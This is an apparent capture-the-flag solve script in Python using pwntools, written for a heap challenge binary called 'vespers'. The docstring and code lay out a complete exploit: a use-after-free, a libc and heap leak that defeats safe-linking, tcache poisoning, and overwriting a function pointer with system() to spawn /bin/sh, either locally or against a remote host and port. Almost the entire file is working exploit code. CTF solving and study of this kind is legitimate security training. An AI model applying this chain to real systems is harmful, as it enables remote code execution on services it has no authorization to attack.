#!/usr/bin/env python3
"""
Saint Vespers and the Copper Choir - solve script

Bug: op_retire() frees both the chorister struct and its transcript
buffer, but never clears the slot pointer and op_restore() flips the
slot back to "active" without reallocating anything. Any operation on
a restored-but-never-reallocated seat is therefore a use-after-free.

Chain:
  1. Free a large (>0x408) transcript into the unsorted bin, then UAF-read
     it via the restoration bug to leak libc (unsorted bin fd/bk points
     into main_arena).
  2. Free a chorister struct (0x58 request -> 0x60 tcache chunk) into an
     otherwise-empty tcache bin and UAF-read it (via the ledger/roster,
     which happily prints archived seats too) to get the safe-linking
     "mangled NULL" = chunk_addr >> 12. Since our few allocations sit in
     the heap's first page, this also gives heap_base.
  3. Tcache-poison: overwrite that struct's fd (rename() writes straight
     into offset 0 of the struct, i.e. the freed chunk's fd) so the next
     pop in that bin returns a pointer we choose - the start of a chorister
     that is still alive and will be called during the Final Performance.
     A second, never-poisoned struct is parked in the same bin first so
     the tcache count stays non-zero long enough for the poisoned pop to
     actually happen.
  4. Recruit once more; its transcript allocation lands exactly on the
     live chorister's own memory. The write is fully attacker-controlled,
     so we overwrite its `sing` callback with system()'s address while
     its `name` field (offset 0, i.e. the struct's own address) still
     reads "/bin/sh\\0" - a struct-pointer-as-string trick.
  5. Final Performance calls sing(self) == system(self) == system("/bin/sh").
"""

import os
import sys
from pwn import *

context.log_level = 'info'

HERE = os.path.dirname(os.path.abspath(__file__))
EXE_PATH = os.path.join(HERE, '..', 'dist', 'vespers')
LIBC_PATH = os.path.join(HERE, '..', 'dist', 'libc.so.6')

exe = context.binary = ELF(EXE_PATH, checksec=False)
libc = ELF(LIBC_PATH, checksec=False)

# Structural offsets - fixed by the fixed sequence of allocations we make
# below, deterministic given the shipped binary/libc for a fresh process.
L_OFFSET        = 0x2a0     # &L (the first chorister struct) - heap_base
UNSORTED_DELTA  = 0x21ace0  # unsorted-bin leak - libc_base (glibc 2.35, jammy)
SYSTEM_OFFSET   = libc.symbols['system']

NAME_SIZE = 0x38


def start():
    # ./solve.py                 -> spawn the local dist/vespers binary
    # ./solve.py HOST PORT       -> connect to a remote instance
    if len(sys.argv) >= 3:
        return remote(sys.argv[1], int(sys.argv[2]))
    # the patched interpreter path (./ld-2.35.so) is resolved relative to
    # the process cwd at exec time, so run from inside dist/
    return process([exe.path], cwd=os.path.dirname(exe.path))


io = start()


def menu(choice):
    io.sendlineafter(b'> ', str(choice).encode())


def recruit(name, style, length, data):
    menu(1)
    io.sendlineafter(b'Name this chorister: ', name)
    io.sendlineafter(b'Harmony): ', str(style).encode())
    io.sendlineafter(b'-4096): ', str(length).encode())
    io.sendafter(b'raw bytes): ', data)


def retire(idx):
    menu(2)
    io.sendlineafter(b'Retire which seat? ', str(idx).encode())


def restore(idx):
    menu(3)
    io.sendlineafter(b'Restore which seat? ', str(idx).encode())


def recite(idx):
    menu(5)
    io.sendlineafter(b'Recite which seat? ', str(idx).encode())
    io.recvuntil(b'bytes):\n')


def rename(idx, data):
    menu(6)
    io.sendlineafter(b'Rename which seat? ', str(idx).encode())
    io.sendafter(b'raw bytes): ', data)


def roster_read(idx, status=b'active'):
    menu(7)
    io.recvuntil(b'Seat %d [%s]: ' % (idx, status))
    return io.recvn(NAME_SIZE)


# --- seat the choir -------------------------------------------------------
recruit(b'/bin/sh', 0, 0x10, b'L' * 0x10)   # idx0: the eventual sing(self) target
recruit(b'spare', 0, 0x10, b'X' * 0x10)     # idx1: keeps the tcache bin non-empty
recruit(b'archive', 0, 0x500, b'B' * 0x500)  # idx2: big transcript for the libc leak
recruit(b'spacer', 0, 0x10, b'S' * 0x10)    # idx3: stops top-chunk consolidation

# --- retire the spare; leave it dangling forever --------------------------
retire(1)

# --- retire + restore the archive seat: our reusable UAF handle -----------
retire(2)
restore(2)

# --- libc leak: UAF-read the freed unsorted-bin chunk ----------------------
recite(2)
leak = u64(io.recvn(8))
io.recvn(8)
libc.address = leak - UNSORTED_DELTA
system_addr = libc.address + SYSTEM_OFFSET
log.success(f'libc base   = {hex(libc.address)}')
log.success(f'system()    = {hex(system_addr)}')

# --- heap leak: UAF-read the spare's own (freed) struct via the ledger ----
raw = roster_read(1, status=b'archived')
K = u64(raw[:8])                 # mangled(NULL) = spare_struct_addr >> 12
heap_base = K << 12
target_addr = heap_base + L_OFFSET
log.success(f'heap base   = {hex(heap_base)}')
log.success(f'target (&L) = {hex(target_addr)}')

# --- tcache poison: point the archive seat's freed struct at &L -----------
mangled = (target_addr ^ K) & 0xffffffffffffffff
rename(2, p64(mangled) + b'\x00' * (NAME_SIZE - 1 - 8))

# --- pop the poisoned chunk and overwrite L in place -----------------------
# struct-malloc of this call reclaims the spare's struct chunk (harmless);
# the transcript-malloc that follows lands exactly on &L.
payload = b'/bin/sh\x00' + b'\x00' * (NAME_SIZE - 8) + p64(system_addr) + b'\x00' * 9
assert len(payload) == 0x49
recruit(b'C', 0, 0x49, payload)

# --- Final Performance: L->sing(L) == system(L) == system("/bin/sh") ------
menu(8)

io.interactive()
